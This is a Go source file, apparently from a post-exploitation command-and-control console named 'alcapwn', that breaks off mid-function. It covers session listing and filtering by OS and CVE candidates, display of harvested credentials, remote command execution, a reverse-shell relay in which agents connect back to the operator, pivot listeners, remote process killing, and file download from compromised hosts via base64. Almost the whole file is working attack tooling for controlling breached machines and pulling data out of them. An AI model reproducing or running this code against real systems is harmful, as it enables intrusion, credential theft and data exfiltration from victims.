package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	"alcapwn/proto"
)

// fmtAge formats a duration as a short human-readable string.
func fmtAge(d time.Duration) string {
	d = d.Round(time.Second)
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	}
	if d < time.Hour {
		return fmt.Sprintf("%dm", int(d.Minutes()))
	}
	return fmt.Sprintf("%dh", int(d.Hours()))
}

func (c *Console) cmdSessions(args []string) {
	// Parse flags from args
	// Usage: sessions [--filter os=<val>|hostname=<val>|ip=<val>|cve] [--group os|container|status|match_count] [--sort id|-id|uptime|-uptime|match_count]
	var filterOS, filterHostname, filterIP, filterCVE string
	var groupBy string
	var sortBy string

	for i := 0; i < len(args); i++ {
		switch {
		case args[i] == "--filter" && i+1 < len(args):
			i++
			val := args[i]
			switch {
			case strings.HasPrefix(val, "os="):
				filterOS = strings.TrimPrefix(val, "os=")
			case strings.HasPrefix(val, "hostname="):
				filterHostname = strings.TrimPrefix(val, "hostname=")
			case strings.HasPrefix(val, "ip="):
				filterIP = strings.TrimPrefix(val, "ip=")
			case strings.HasPrefix(val, "cve="):
				filterCVE = strings.TrimPrefix(val, "cve=")
			default:
				filterCVE = val
			}
		case args[i] == "--group" && i+1 < len(args):
			i++
			groupBy = args[i]
		case args[i] == "--sort" && i+1 < len(args):
			i++
			sortBy = args[i]
		}
	}

	sessions := c.registry.All()
	if len(sessions) == 0 {
		fmt.Println("[*] No active sessions.")
		return
	}

	// Filter sessions
	var filtered []*Session
	for _, s := range sessions {
		if !matchesFilter(s, filterOS, filterHostname, filterIP, filterCVE) {
			continue
		}
		filtered = append(filtered, s)
	}

	if len(filtered) == 0 {
		fmt.Println("[*] No sessions match the filter criteria.")
		return
	}

	// Sort sessions
	c.sortSessions(filtered, sortBy)

	// Group and display
	if groupBy != "" {
		c.displayGroupedSessions(filtered, groupBy)
	} else {
		c.displaySessions(filtered)
	}
}

// matchesFilter checks if a session matches the filter criteria
func matchesFilter(s *Session, osFilter, hostnameFilter, ipFilter, cveFilter string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	// OS filter
	if osFilter != "" {
		if s.Findings == nil || s.Findings.OS == nil {
			return false
		}
		osLower := strings.ToLower(*s.Findings.OS)
		if !strings.Contains(osLower, strings.ToLower(osFilter)) {
			return false
		}
	}

	// Hostname filter
	if hostnameFilter != "" {
		if s.Findings == nil || s.Findings.Hostname == nil {
			return false
		}
		hostLower := strings.ToLower(*s.Findings.Hostname)
		if !strings.Contains(hostLower, strings.ToLower(hostnameFilter)) {
			return false
		}
	}

	// IP filter
	if ipFilter != "" {
		addr := s.RemoteAddr
		if !strings.Contains(addr, ipFilter) {
			return false
		}
	}

	// CVE filter
	if cveFilter != "" {
		if s.Findings == nil {
			return false
		}
		hasCVE := len(s.Findings.CveCandidates) > 0
		if strings.ToLower(cveFilter) == "cve" && !hasCVE {
			return false
		}
		if strings.ToLower(cveFilter) == "high" || strings.ToLower(cveFilter) == "critical" {
			found := false
			for _, cve := range s.Findings.CveCandidates {
				if strings.Contains(strings.ToLower(cve.Severity), strings.ToLower(cveFilter)) {
					found = true
					break
				}
			}
			if !found {
				return false
			}
		}
	}

	return true
}

// sortSessions sorts sessions by the specified field
func (c *Console) sortSessions(sessions []*Session, sortBy string) {
	switch sortBy {
	case "uptime":
		sort.Slice(sessions, func(i, j int) bool {
			return sessions[i].StartTime.Before(sessions[j].StartTime)
		})
	case "-uptime":
		sort.Slice(sessions, func(i, j int) bool {
			return sessions[i].StartTime.After(sessions[j].StartTime)
		})
	case "match_count":
		// Pre-compute match counts outside the sort comparator to avoid
		// acquiring persistMu on every comparison (O(N*logN) lock ops).
		counts := make(map[int]int)
		c.persistMu.Lock()
		for _, p := range c.persist.Profiles {
			for _, sid := range p.Sessions {
				counts[sid]++
			}
		}
		c.persistMu.Unlock()
		sort.Slice(sessions, func(i, j int) bool {
			return counts[sessions[i].ID] > counts[sessions[j].ID]
		})
	case "id":
		sort.Slice(sessions, func(i, j int) bool {
			return sessions[i].ID < sessions[j].ID
		})
	case "-id":
		sort.Slice(sessions, func(i, j int) bool {
			return sessions[i].ID > sessions[j].ID
		})
	}
}

// displaySessions shows sessions in the standard format
func (c *Console) displaySessions(sessions []*Session) {
	hdr := fmt.Sprintf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s",
		"ID", "Remote", "User", "OS", "CVEs", "TLS", "Age")
	sep := fmt.Sprintf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s",
		"──", "────────────────────", "────────────", "────────────────────────", "────", "───", "───")
	fmt.Println(ansiBold + hdr + ansiReset)
	fmt.Println(ansiDim + sep + ansiReset)

	for _, s := range sessions {
		s.mu.Lock()
		age := fmtAge(time.Since(s.StartTime))
		tlsStr := "✗"
		if s.TLS {
			tlsStr = ansiGreen + "✓" + ansiReset
		}

		var user, osStr, cveStr string
		suffix := ""

		if s.IsAgent && s.AgentMeta != nil {
			user = s.AgentMeta.User
			osStr = s.AgentMeta.OS + "/" + s.AgentMeta.Arch
			cveStr = "-"
			suffix = ansiGreen + "  [agent]" + ansiReset
		} else if s.Findings == nil {
			user = "..."
			osStr = "..."
			cveStr = "..."
			suffix = ansiDim + "  ← recon running" + ansiReset
		} else {
			if s.Findings.User != nil {
				user = safeFindings(*s.Findings.User)
			} else {
				user = "unknown"
			}
			if s.Findings.OS != nil {
				osStr = safeFindings(*s.Findings.OS)
			} else {
				osStr = "unknown"
			}
			cveStr = strconv.Itoa(len(s.Findings.CveCandidates))
		}
		if s.IsRoot {
			user = user + "#"
		}

		// Truncate long fields for display.
		user = truncate(user, 12)
		osStr = truncate(osStr, 24)

		// Show label when set, otherwise strip port from remote addr.
		remote := s.RemoteAddr
		if h, _, err := net.SplitHostPort(remote); err == nil {
			remote = h
		}
		if s.Label != "" {
			remote = s.Label
		}
		remote = truncate(remote, 20)

		isRoot := s.IsRoot
		noFindings := s.Findings == nil
		s.mu.Unlock()

		row := fmt.Sprintf("  %-4d  %-20s  %-12s  %-24s  %-4s  %-3s  %s%s",
			s.ID, remote, user, osStr, cveStr, tlsStr, age, suffix)

		switch {
		case isRoot:
			fmt.Println(ansiBoldGreen + row + ansiReset)
		case noFindings:
			fmt.Println(ansiDim + row + ansiReset)
		default:
			fmt.Println(row)
		}
	}
}

// displayGroupedSessions shows sessions grouped by the specified field
func (c *Console) displayGroupedSessions(sessions []*Session, groupBy string) {
	groups := make(map[string][]*Session)

	for _, s := range sessions {
		s.mu.Lock()
		var key string
		switch groupBy {
		case "os":
			if s.Findings != nil && s.Findings.OS != nil {
				key = *s.Findings.OS
			} else {
				key = "unknown"
			}
		case "container":
			if s.Findings != nil && s.Findings.ContainerDetected {
				key = "container"
			} else {
				key = "bare-metal"
			}
		case "status":
			if s.State == SessionStateInteractive {
				key = "interactive"
			} else {
				key = "backgrounded"
			}
		case "match_count":
			count := len(s.Matches)
			if count == 0 {
				key = "0"
			} else if count < 3 {
				key = "1-2"
			} else {
				key = "3+"
			}
		default:
			key = "unknown"
		}
		s.mu.Unlock()
		groups[key] = append(groups[key], s)
	}

	for group, sessList := range groups {
		fmt.Printf("\n%s[%s]%s\n", ansiBoldCyan, group, ansiReset)
		hdr := fmt.Sprintf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s",
			"ID", "Remote", "User", "OS", "CVEs", "TLS", "Age")
		sep := fmt.Sprintf("  %-4s  %-20s  %-12s  %-24s  %-4s  %-3s  %s",
			"──", "────────────────────", "────────────", "────────────────────────", "────", "───", "───")
		fmt.Println(ansiBold + hdr + ansiReset)
		fmt.Println(ansiDim + sep + ansiReset)
		for _, s := range sessList {
			s.mu.Lock()
			age := fmtAge(time.Since(s.StartTime))
			tlsStr := "✗"
			if s.TLS {
				tlsStr = ansiGreen + "✓" + ansiReset
			}

			var user, osStr, cveStr string
			suffix := ""

			if s.Findings == nil {
				user = "..."
				osStr = "..."
				cveStr = "..."
				suffix = ansiDim + "  ← recon running" + ansiReset
			} else {
				if s.Findings.User != nil {
					user = safeFindings(*s.Findings.User)
				} else {
					user = "unknown"
				}
				if s.Findings.OS != nil {
					osStr = safeFindings(*s.Findings.OS)
				} else {
					osStr = "unknown"
				}
				cveStr = strconv.Itoa(len(s.Findings.CveCandidates))
			}
			if s.IsRoot {
				user = user + "#"
			}

			user = truncate(user, 12)
			osStr = truncate(osStr, 24)

			remote := s.RemoteAddr
			if h, _, err := net.SplitHostPort(remote); err == nil {
				remote = h
			}
			if s.Label != "" {
				remote = s.Label
			}
			remote = truncate(remote, 20)

			isRoot := s.IsRoot
			noFindings := s.Findings == nil
			s.mu.Unlock()

			row := fmt.Sprintf("  %-4d  %-20s  %-12s  %-24s  %-4s  %-3s  %s%s",
				s.ID, remote, user, osStr, cveStr, tlsStr, age, suffix)
			switch {
			case isRoot:
				fmt.Println(ansiBoldGreen + row + ansiReset)
			case noFindings:
				fmt.Println(ansiDim + row + ansiReset)
			default:
				fmt.Println(row)
			}
		}
	}
}

func (c *Console) cmdUse(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: use <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is already active.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if sess.IsAgent {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is an agent session — use 'exec %d <cmd>' to run commands.\n", id, id)
		fmt.Printf("    Interactive PTY support for agents is planned for a future phase.\n")
		return
	}
	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	sess.State = SessionStateInteractive
	sess.mu.Unlock()

	c.state.mu.Lock()
	c.state.activeSessionID = id
	c.state.mu.Unlock()

	c.interactWithSession(sess)

	c.state.mu.Lock()
	c.state.activeSessionID = 0
	c.state.mu.Unlock()
}

func (c *Console) cmdKill(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: kill <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	conn := sess.ActiveConn
	plain := sess.Conn
	sess.mu.Unlock()

	if conn == nil {
		conn = plain
	}
	if conn != nil {
		killRemoteProcessGroup(conn)
		conn.Close()
	}
	if plain != nil && plain != conn {
		plain.Close()
	}

	// Close any active pivot listeners for this session.
	sess.mu.Lock()
	ps := sess.pivotState
	sess.pivotState = nil
	sess.mu.Unlock()
	if ps != nil {
		ps.Close()
	}

	c.registry.Remove(id)
	fmt.Printf("[*] Session %d terminated.\n", id)
}

func (c *Console) cmdInfo(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: info <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	findings := sess.Findings
	matches := sess.Matches
	creds := sess.HarvestedCreds
	isRoot := sess.IsRoot
	rootLevel := sess.RootLevel
	agentMeta := sess.AgentMeta
	isAgent := sess.IsAgent
	ps := sess.pivotState
	sess.mu.Unlock()

	// Agent sessions: display metadata from the Hello handshake.
	if isAgent {
		if agentMeta == nil {
			fmt.Printf("[!] Session %d agent metadata not yet available.\n", id)
			return
		}
		if isRoot {
			fmt.Printf("\n  %s*** PRIVILEGED — uid=0 (%s) ***%s\n", ansiBoldRed, rootLevel, ansiReset)
		}
		fmt.Printf("\n[AGENT SESSION %d]\n", id)
		fmt.Printf("  %-14s %s\n", "Version:", agentMeta.Version)
		fmt.Printf("  %-14s %s\n", "Machine ID:", agentMeta.MachineID)
		fmt.Printf("  %-14s %s\n", "Hostname:", safeFindings(agentMeta.Hostname))
		fmt.Printf("  %-14s %s / %s\n", "Platform:", agentMeta.OS, agentMeta.Arch)
		fmt.Printf("  %-14s %s (uid=%s)\n", "User:", safeFindings(agentMeta.User), agentMeta.UID)
		if agentMeta.Shell != "" {
			fmt.Printf("  %-14s %s\n", "Shell:", safeFindings(agentMeta.Shell))
		} else {
			fmt.Printf("  %-14s %s\n", "Shell:", "(built-in minishell)")
		}
		if ps != nil && len(ps.fwdListeners) > 0 {
			fmt.Println("\n[ACTIVE PIVOTS]")
			for port := range ps.fwdListeners {
				fmt.Printf("  127.0.0.1:%d\n", port)
			}
		}
		if creds != nil && *creds != "" {
			fmt.Println("\n[HARVESTED CREDENTIALS]")
			fmt.Println(stripDangerousAnsi(*creds))
		}
		fmt.Println()
		return
	}

	if findings == nil {
		fmt.Printf("[!] No recon data for session %d — run 'recon %d' first.\n", id, id)
		return
	}

	if isRoot {
		fmt.Printf("\n  %s*** PRIVILEGED — uid=0 (%s) ***%s\n", ansiBoldRed, rootLevel, ansiReset)
	}

	printSummary(findings, matches)

	if creds != nil && *creds != "" {
		fmt.Println("\n[HARVESTED CREDENTIALS]")
		fmt.Println(stripDangerousAnsi(*creds))
	}
}

// cmdExec runs a single command on a backgrounded session and returns raw output.
// Usage: exec <id> <command> [args...]
func (c *Console) cmdExec(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: exec <id> <command>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}

	// Build the command string (everything after the session ID).
	var cmdParts []string
	for i := 1; i < len(args); i++ {
		cmdParts = append(cmdParts, args[i])
	}
	cmdStr := strings.Join(cmdParts, " ")

	// Agent sessions: dispatch via structured task protocol.
	if sess.IsAgent {
		sess.mu.Unlock()
		if cmdStr == "" {
			fmt.Println("[!] Usage: exec <id> <command>")
			return
		}
		res, err := agentExec(sess, cmdStr, 30*time.Second)
		if err != nil {
			fmt.Printf("[!] Exec failed: %v\n", err)
			return
		}
		if res.Error != "" {
			fmt.Printf("[!] Remote error: %s\n", res.Error)
		}
		if len(res.Output) > 0 {
			fmt.Print(stripDangerousAnsi(string(res.Output)))
			if !strings.HasSuffix(string(res.Output), "\n") {
				fmt.Println()
			}
		}
		return
	}

	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	u := sess.Upgrader
	drainWasRunning := sess.drainStop != nil
	conn := sess.ActiveConn
	if conn == nil {
		conn = sess.Conn
	}
	sess.mu.Unlock()

	// Stop the drain goroutine before reading so it cannot steal response bytes.
	u.clearDeadline()
	c.stopDrain(sess)
	defer func() {
		if drainWasRunning {
			c.startDrain(sess, conn)
		}
	}()

	// Send command and read output
	if err := u.write(cmdStr + "\n"); err != nil {
		fmt.Printf("[!] Failed to send command: %v\n", err)
		return
	}

	// Read until prompt (with short timeout for single command)
	output, err := u.readUntilPrompt(5 * time.Second)
	if err != nil {
		fmt.Printf("[!] Failed to read command output: %v\n", err)
		return
	}

	// Strip prompts and echo of our command
	clean := u.StripPrompts(output)
	// Remove the command we sent from the output (if present)
	lines := strings.Split(clean, "\n")
	if len(lines) > 0 && strings.TrimSpace(lines[0]) == strings.TrimSpace(cmdStr) {
		lines = lines[1:]
	}
	clean = strings.Join(lines, "\n")
	// Trim trailing whitespace but preserve any final newline
	clean = strings.TrimRight(clean, "\t ")

	if clean != "" {
		// Always strip dangerous ANSI sequences — remote output is untrusted.
		// Warn additionally if the output looks like TUI/interactive application
		// output (OSC, private-mode CSI) so the operator knows to use 'use <id>'.
		if containsAnsiSequences(clean) {
			fmt.Println("[!] WARNING: Command output contains ANSI sequences - interactive TUI detected!")
			fmt.Println("[!] Use 'use <id>' to interact with the session properly.")
		}
		fmt.Println(stripDangerousAnsi(clean))
	}
}

// safeFindings strips ANSI escape sequences and control characters from a
// string that originated on the remote machine (hostname, username, OS, etc.).
// This prevents a hostile target from injecting terminal escape sequences
// (e.g. OSC 52 clipboard hijack, screen-clear) via crafted recon output.
func safeFindings(s string) string {
	if s == "" {
		return s
	}
	return stripDangerousAnsi(s)
}

// containsAnsiSequences checks if output contains ANSI escape sequences
// that typically indicate interactive/TUI behavior.
func containsAnsiSequences(s string) bool {
	// OSC sequences (\x1b]) with content that suggests TUI operations
	// \x1b]0; - terminal title (usually benign)
	// \x1b]52; - clipboard operations (dangerous, also pbsh attack vector)
	// \x1b]10; - color queries
	for i := 0; i < len(s)-2; i++ {
		if s[i] == '\x1b' && i+1 < len(s) && s[i+1] == ']' {
			// Found OSC - check if it's suspicious
			if i+2 < len(s) {
				switch s[i+2] {
				case '0', '5', 'P', '^', 'X', '_': // DCS, PM, SOS, APC
					return true
				}
			}
		}
		// Check for cursor movement/ANSI that's not simple color
		// \x1b[?... - private mode (often used by TUI apps)
		if s[i] == '\x1b' && i+1 < len(s) && s[i+1] == '[' {
			if i+2 < len(s) && s[i+2] == '?' {
				return true
			}
		}
	}
	return false
}

// stripDangerousAnsi removes sequences that cause TUI corruption while
// preserving simple colors (3/4 bit) that are generally safe.
func stripDangerousAnsi(s string) string {
	var result strings.Builder
	var i int
	for i < len(s) {
		// Preserve UTF-8 multibyte sequences: lead bytes 0xC0-0xFF introduce
		// 2-4 byte sequences whose continuation bytes (0x80-0xBF) overlap C1.
		if s[i] >= 0xc0 {
			// Determine the length of the UTF-8 sequence from the lead byte.
			seqLen := 1
			switch {
			case s[i] < 0xe0:
				seqLen = 2
			case s[i] < 0xf0:
				seqLen = 3
			default:
				seqLen = 4
			}
			end := i + seqLen
			if end > len(s) {
				end = len(s)
			}
			result.WriteString(s[i:end])
			i = end
			continue
		}
		// Strip C1 control codes (0x80-0x9F) — 8-bit equivalents of dangerous ESC sequences.
		// These have no legitimate use in UTF-8 terminal output.
		if s[i] >= 0x80 && s[i] <= 0x9f {
			i++
			continue
		}
		if s[i] == '\x1b' && i+1 < len(s) {
			if s[i+1] == '[' {
				// CSI sequence - detect type
				start := i
				i += 2
				// Skip parameters (digits, semicolons, spaces)
				for i < len(s) && ((s[i] >= '0' && s[i] <= '9') || s[i] == ';' || s[i] == ' ') {
					i++
				}
				if i < len(s) {
					finalByte := s[i]
					i++
					// Skip private mode sequences (?)
					if finalByte == '?' {
						for i < len(s) && !((s[i] >= 'A' && s[i] <= 'Z') || (s[i] >= 'a' && s[i] <= 'z') || (s[i] >= '@' && s[i] <= '~')) {
							i++
						}
						if i < len(s) {
							i++
						}
						continue
					}
					// Check for dangerous sequences that move cursor or clear screen
					// Keep only 'm' (color) and ignore cursor positioning/clearing
					switch finalByte {
					case 'H', 'f', 'J', 'K', 'A', 'B', 'C', 'D', 'P', 'X', 'S', 'T':
						// These move cursor, clear, or scroll - skip the whole sequence
						continue
					default:
						// Keep other CSI sequences (colors, etc.)
						result.WriteString(s[start:i])
						continue
					}
				}
				continue
			}
			if s[i+1] == ']' {
				// OSC sequence - skip entirely (TUI behavior)
				i += 2
				for i < len(s) && s[i] != '\x07' && !(s[i] == '\x1b' && i+1 < len(s) && s[i+1] == '\\') {
					i++
				}
				if i < len(s) {
					if s[i] == '\x07' {
						i++
					} else if s[i] == '\x1b' && i+1 < len(s) && s[i+1] == '\\' {
						i += 2
					}
				}
				continue
			}
			if s[i+1] == '_' || s[i+1] == '^' || s[i+1] == 'X' || s[i+1] == 'P' {
				// APC, PM, SOS, DCS — skip entire sequence body up to ST (\x1b\) or end of string
				i += 2
				foundST := false
				for i < len(s)-1 {
					if s[i] == 0x1b && s[i+1] == '\\' {
						i += 2
						foundST = true
						break
					}
					i++
				}
				// If we reached end of string without finding ST, skip remaining byte
				if !foundST && i < len(s) {
					i = len(s)
				}
				continue
			}
		}
		result.WriteByte(s[i])
		i++
	}
	return result.String()
}

// cmdShell opens an interactive shell on an agent session via the relay
// mechanism.  The agent starts its system shell and pipes stdio through a
// dedicated TCP relay connection so the operator gets a raw interactive shell
// without multiplexing through the encrypted task channel.
//
// Usage: shell <id>
func (c *Console) cmdShell(args []string) {
	if len(args) < 1 {
		fmt.Println("Usage: shell <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] Session %d not found\n", id)
		return
	}
	if !sess.IsAgent {
		fmt.Printf("[!] Session %d is not an agent — use 'use %d' for PTY sessions\n", id, id)
		return
	}

	relayLn, relayAddr, err := c.openRelayListener(sess)
	if err != nil {
		fmt.Printf("[!] shell: %v\n", err)
		return
	}

	// Dispatch TaskShell; the agent will dial relayAddr and exec its shell.
	// This blocks until the shell exits, so run it in a goroutine.
	shellDone := make(chan error, 1)
	go func() {
		res, dispErr := agentDispatch(sess, proto.Task{
			ID:    agentTaskID("sh"),
			Kind:  proto.TaskShell,
			Relay: relayAddr,
		}, 60*time.Minute)
		if dispErr != nil {
			shellDone <- dispErr
		} else if res.Error != "" {
			shellDone <- fmt.Errorf("%s", res.Error)
		} else {
			shellDone <- nil
		}
	}()

	// Accept agent's relay-back connection (30 s window).
	relayLn.(*net.TCPListener).SetDeadline(time.Now().Add(30 * time.Second))
	relayConn, err := relayLn.Accept()
	relayLn.Close()
	if err != nil {
		fmt.Printf("[!] shell: agent did not connect back: %v\n", err)
		return
	}

	// Enter raw interactive I/O.  shellInteract blocks until the shell exits.
	c.shellInteract(id, relayConn)
	relayConn.Close()

	// Wait briefly for the agent's TaskShell result so error is surfaced.
	select {
	case shErr := <-shellDone:
		if shErr != nil {
			fmt.Printf("[!] shell: %v\n", shErr)
		}
	case <-time.After(3 * time.Second):
	}
}

// cmdPs lists processes on a backgrounded session.
// Usage: ps <id>
func (c *Console) cmdPs(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: ps <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	u := sess.Upgrader
	drainWasRunning := sess.drainStop != nil
	conn := sess.ActiveConn
	if conn == nil {
		conn = sess.Conn
	}
	sess.mu.Unlock()

	u.clearDeadline()
	c.stopDrain(sess)
	defer func() {
		if drainWasRunning {
			c.startDrain(sess, conn)
		}
	}()

	// Send ps command - use -eo for full format with PID, user, %CPU, %MEM, command
	cmdStr := "ps -eo pid,user,%cpu,%mem,comm --no-headers 2>/dev/null || ps aux 2>/dev/null\n"
	if err := u.write(cmdStr); err != nil {
		fmt.Printf("[!] Failed to send command: %v\n", err)
		return
	}

	// Read until prompt
	output, err := u.readUntilPrompt(10 * time.Second)
	if err != nil {
		fmt.Printf("[!] Failed to read process list: %v\n", err)
		return
	}

	// Strip prompts, then strip dangerous ANSI — process names are remote-controlled.
	clean := stripDangerousAnsi(u.StripPrompts(output))

	if clean != "" {
		fmt.Println(clean)
	}
}

// cmdKillproc kills a specific process on a backgrounded session.
// Usage: killproc <id> <pid> [signal]
func (c *Console) cmdKillproc(args []string) {
	if len(args) < 2 {
		fmt.Println("[!] Usage: killproc <id> <pid> [signal]")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	pidStr := args[1]

	signal := "SIGTERM"
	if len(args) > 2 {
		signal = args[2]
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	u := sess.Upgrader
	drainWasRunning := sess.drainStop != nil
	conn := sess.ActiveConn
	if conn == nil {
		conn = sess.Conn
	}
	sess.mu.Unlock()

	u.clearDeadline()
	c.stopDrain(sess)
	defer func() {
		if drainWasRunning {
			c.startDrain(sess, conn)
		}
	}()

	// Send kill command
	cmdStr := fmt.Sprintf("kill -%s %s 2>&1\n", signal, pidStr)
	if err := u.write(cmdStr); err != nil {
		fmt.Printf("[!] Failed to send command: %v\n", err)
		return
	}

	// Read until prompt
	output, err := u.readUntilPrompt(5 * time.Second)
	if err != nil {
		fmt.Printf("[!] Failed to read command output: %v\n", err)
		return
	}

	clean := stripDangerousAnsi(u.StripPrompts(output))

	if clean != "" {
		fmt.Println(clean)
	}
}

// cmdDownload downloads a file from the remote session to the local machine.
// Usage: download <id> <remote_path> [local_path]
func (c *Console) cmdDownload(args []string) {
	if len(args) < 2 {
		fmt.Println("[!] Usage: download <id> <remote_path> [local_path]")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	remotePath := args[1]

	// Determine local path
	var localPath string
	if len(args) > 2 {
		localPath = args[2]
	} else {
		// Default: hostname_timestamp_remote_path
		sess := c.registry.Get(id)
		if sess == nil {
			fmt.Printf("[!] No session with ID %d.\n", id)
			return
		}
		sess.mu.Lock()
		remoteAddr := sess.RemoteAddr
		label := sess.Label
		sess.mu.Unlock()

		var host string
		if label != "" {
			host = label
		} else {
			host = remoteAddr
			if h, _, splitErr := net.SplitHostPort(remoteAddr); splitErr == nil {
				host = h
			}
			host = sanitizeLabel(strings.ReplaceAll(host, ".", "_"))
		}

		// Convert remote path to filename-safe string
		safeRemote := strings.ReplaceAll(remotePath, "/", "_")
		safeRemote = strings.TrimPrefix(safeRemote, "_")
		timestamp := time.Now().Format("20060102_150405")
		localPath = fmt.Sprintf("%s_%s_%s", host, timestamp, safeRemote)
	}

	// Security: local path must be in current directory or subdirectory
	absLocal, err := filepath.Abs(localPath)
	if err != nil {
		fmt.Printf("[!] Invalid local path: %v\n", err)
		return
	}
	absCwd, _ := os.Getwd()
	if !strings.HasPrefix(absLocal, absCwd+string(os.PathSeparator)) && absLocal != absCwd {
		fmt.Println("[!] Security: Files can only be downloaded to current directory or subdirectories")
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}

	// Agent sessions: use structured file transfer.
	if sess.IsAgent {
		sess.mu.Unlock()
		fmt.Printf("[*] Downloading %s from session %d...\n", remotePath, id)
		data, dlErr := agentDownload(sess, remotePath)
		if dlErr != nil {
			fmt.Printf("[!] Download failed: %v\n", dlErr)
			return
		}
		if err := os.WriteFile(localPath, data, 0600); err != nil {
			fmt.Printf("[!] Failed to save file: %v\n", err)
			return
		}
		fmt.Printf("[+] Saved %d bytes to %s\n", len(data), localPath)
		return
	}

	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	u := sess.Upgrader
	drainWasRunning := sess.drainStop != nil
	conn := sess.ActiveConn
	if conn == nil {
		conn = sess.Conn
	}
	sess.mu.Unlock()

	u.clearDeadline()
	c.stopDrain(sess)
	defer func() {
		if drainWasRunning {
			c.startDrain(sess, conn)
		}
	}()

	// Drain any residual bash prompt left by a previous command before writing.
	u.readUntilPrompt(500 * time.Millisecond) //nolint:errcheck — best-effort pre-drain
	u.clearDeadline()

	// Use `base64 < file` (coreutils, always available) rather than python3,
	// since python3 may not be installed on the remote.
	// Sentinel in the command echo appears as:
	//   "echo ALCAPWN_DL_START; base64 < ...; echo ALCAPWN_DL_END"
	// (single line, not matching the bare sentinel).  The actual command output
	// has sentinels on their own lines, so exact-line matching works.
	safeRemote := "'" + strings.ReplaceAll(remotePath, "'", "'\"'\"'") + "'"
	cmdStr := fmt.Sprintf("echo ALCAPWN_DL_START; base64 < %s 2>&1; echo ALCAPWN_DL_END\n", safeRemote)
	if err := u.write(cmdStr); err != nil {
